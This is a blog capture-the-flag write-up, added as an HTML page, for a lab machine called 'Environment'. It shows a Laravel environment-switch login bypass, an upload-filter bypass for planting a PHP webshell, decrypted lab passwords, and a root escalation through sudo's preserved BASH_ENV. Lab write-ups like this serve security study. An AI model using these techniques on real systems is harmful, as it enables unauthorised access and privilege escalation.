@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>Linux - Medium - Environment - abno&#39;s blog</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">abno&#39;s blog</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">Linux - Medium - Environment</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1747248596179"
+                  >2025-05-14 20:49</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1747831997047"
+                  >2025-05-21 14:53</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
+<p>Save the earth!</p>
+<p><img src="/_resources/27908046cfbe4a48964798777fcc98df.png" /></p>
+<p><img src="/_resources/024ad4da909542508697cde50d42a4b9.png" /></p>
+<p><img src="/_resources/e9ccecb27fe84c5ebdec5fe178017f3c.png" /></p>
+<p><img src="/_resources/888526d221c8484ab6342da0f6518bcf.png" /></p>
+<p>We can find the login panel, up status panel and learn that everything is made using laravel. Gobuster doesnt find any subdomains.</p>
+<p><img src="/_resources/7301eda3e0244149ac20ced32b6f9d07.png" /></p>
+<p><img src="/_resources/085261cb735c4e1bb68e981441c56c2b.png" /></p>
+<p>There is also upload panel for something unknown yet.</p>
+<p><img src="/_resources/543e8a4869b54311b761724ebdc69c17.png" /></p>
+<p>I tried exploring it in burp suite, but there is a mechanism that detects the interception and responds with session expired.</p>
+<p><img src="/_resources/60291824247441738ae589ec36eced0f.png" /></p>
+<p>We do know that laravel is in debug mode and there is a <a title="https://github.com/laravel/framework/security/advisories/GHSA-gv7v-rgg6-548h" href="https://github.com/laravel/framework/security/advisories/GHSA-gv7v-rgg6-548h">CVE for bypassing loggin </a>. <code>/login?--env=preprod</code></p>
+<p><img src="/_resources/2b9a091ae55b49bba7c589f3bf869302.png" /></p>
+<h1 id="mailing-list-panel">mailing list panel</h1>
+<p>There is nothing we can do in the dashboard.</p>
+<p><img src="/_resources/b95156b41dca402eaf0f5bfae06f6d3e.png" /></p>
+<p>We can probably abuse the profile picture to try and get a webshell, but there are some restrictions in place.</p>
+<p><img src="/_resources/14225df026744fb68231f1a5ccf9af2d.png" /></p>
+<p>To bypass this restriction, we have to add magicbytes <code>GIF89a;</code>, modfify file type to <code>image/gif</code> and change file type to <code>php.</code>.</p>
+<p><img src="/_resources/c10df9b464b64fd6b808d77fcc540144.png" /></p>
+<p><img src="/_resources/d30d6ead28054c56a3c07f0b51befaf8.png" /></p>
+<p>We can open image in a new tab and get the webshell.</p>
+<p><img src="/_resources/4b4cb7074ece4855af9ab22286cf4a35.png" /></p>
+<p>Shell stabilisationfor Qol.</p>
+<div><pre class="hljs"><code>python3 -c <span class="hljs-string">'import pty;pty.spawn("bash")'</span>
+stty raw -<span class="hljs-built_in">echo</span> 
+^Z
+<span class="hljs-built_in">fg</span></code></pre></div>
+<h1 id="getting-user">Getting user</h1>
+<p>There is only one thing that’s standing out and that’s the backup folder with <code>keyvault.gpg</code>. There is also <code>~/.gnupg</code>, which contains the private key. We can decrypt the file using <code>gpg --decrypt keyvault.gpg</code></p>
+<div><pre class="hljs"><code>~/backup$ gpg <span class="hljs-comment">--decrypt keyvault.gpg      </span>
+gpg: <span class="hljs-built_in">WARNING</span>: unsafe permissions <span class="hljs-keyword">on</span> homedir <span class="hljs-string">'/home/hish/.gnupg'</span>
+gpg: <span class="hljs-keyword">encrypted</span> <span class="hljs-keyword">with</span> <span class="hljs-number">2048</span>-<span class="hljs-type">bit</span> RSA key, ID B755B0EDD6CFCFD3, created <span class="hljs-number">2025</span><span class="hljs-number">-01</span><span class="hljs-number">-11</span>
+      "hish_ &lt;hish@environment.htb&gt;"
+PAYPAL.COM -&gt; Ihaves0meMon$yhere123
+ENVIRONMENT.HTB -&gt; marineSPm@ster!!
+FACEBOOK.COM -&gt; summerSunnyB3ACH!!</code></pre></div>
+<p>We can now login as <code>hish:marineSPm@ster!!</code>.</p>
+<h1 id="priv-esc">Priv esc</h1>
+<div><pre class="hljs"><code>hish<span class="hljs-variable">@environment</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo -l
+[sudo] password <span class="hljs-keyword">for</span> <span class="hljs-symbol">hish:</span> 
+Matching Defaults entries <span class="hljs-keyword">for</span> hish on <span class="hljs-symbol">environment:</span>
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>, env_keep+=<span class="hljs-string">"ENV BASH_ENV"</span>, use_pty
+
+User hish may run the following commands on <span class="hljs-symbol">environment:</span>
+    (ALL) /usr/bin/systeminfo</code></pre></div>
+<p>When running systeminfo, we can see that it first executes <code>dmesg</code>.</p>
+<div><pre class="hljs"><code>hish@environment:~$ sudo systeminfo
+
+### Displaying kernel ring buffer logs (dmesg) ###
+[    <span class="hljs-number">4.490489</span>] cryptd: max_cpu_qlen set to <span class="hljs-number">1000</span>
+[    <span class="hljs-number">4.523176</span>] AVX2 version <span class="hljs-keyword">of</span> gcm_enc/dec engaged.
+[    <span class="hljs-number">4.523241</span>] AES CTR mode by8 optimization enabled</code></pre></div>
+<p>We can check that it uses <code>dmesg</code> from our path and not <code>/usr/bin/dmesg</code>.</p>
+<div><pre class="hljs"><code>hish<span class="hljs-variable">@environment</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>strings <span class="hljs-variable">$(</span>which systeminfo) | grep dmesg
+echo -e <span class="hljs-string">"\n### Displaying kernel ring buffer logs (dmesg) ###"</span>
+dmesg | tail -n <span class="hljs-number">10</span></code></pre></div>
+<p>I tried adding home folder to PATH but it doesnt work, as sudo is run as root, which uses its own path. We can see when running <code>sudo -l</code> that <code>env_keep+="ENV BASH_ENV"</code> is perserved, so we can abuse it. When any script is being run, we can make it start with our custom shell, which will call <code>/bin/bash -p</code>, which keeps root.</p>
+<div><pre class="hljs"><code>echo <span class="hljs-string">"/bin/bash -p"</span> &gt; <span class="hljs-regexp">/tmp/</span>shell.sh
+env -i BASH_ENV=<span class="hljs-regexp">/tmp/</span>shell.sh PATH=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/sbin:/u</span>sr<span class="hljs-regexp">/local/</span>bin:<span class="hljs-regexp">/usr/</span>sbin:<span class="hljs-regexp">/usr/</span>bin:<span class="hljs-regexp">/sbin:/</span>bin sudo <span class="hljs-regexp">/usr/</span>bin/systeminfo</code></pre></div>
+<p>We are then root.</p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
